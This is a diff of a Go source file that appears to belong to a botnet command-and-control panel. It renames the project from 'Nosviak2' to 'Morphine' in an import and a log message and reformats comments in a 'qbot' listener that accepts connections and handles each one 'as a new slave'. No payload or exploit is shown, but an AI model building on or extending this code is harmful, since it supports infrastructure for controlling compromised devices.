@@ -1,13 +1,13 @@
 package qbot
 
 import (
-	"Nosviak2/core/sources/layouts/toml"
+	"Morphine/core/sources/layouts/toml"
 	"fmt"
 	"net"
 )
 
-//creates the handler properly for qbot
-//this will start accepting connections safely
+// creates the handler properly for qbot
+// this will start accepting connections safely
 func NewHandler() error { //error returned from function
 
 	//creates our new network env properly
@@ -16,7 +16,7 @@ func NewHandler() error { //error returned from function
 	if err != nil { //err handles properly
 		return err
 	} else { //little success message for listener started
-		fmt.Printf("[Qbot_Listener] [Qbot server has been started within Nosviak] [%s]\r\n", toml.ConfigurationToml.Qbot.Listener)
+		fmt.Printf("[Qbot_Listener] [Qbot server has been started within Morphine] [%s]\r\n", toml.ConfigurationToml.Qbot.Listener)
 	}
 
 	//loops accepting properly
@@ -31,7 +31,6 @@ func NewHandler() error { //error returned from function
 		//this will handle as a new slave properly
 		HandleConnection(connection)
 	}
-
 
 	return nil
 }
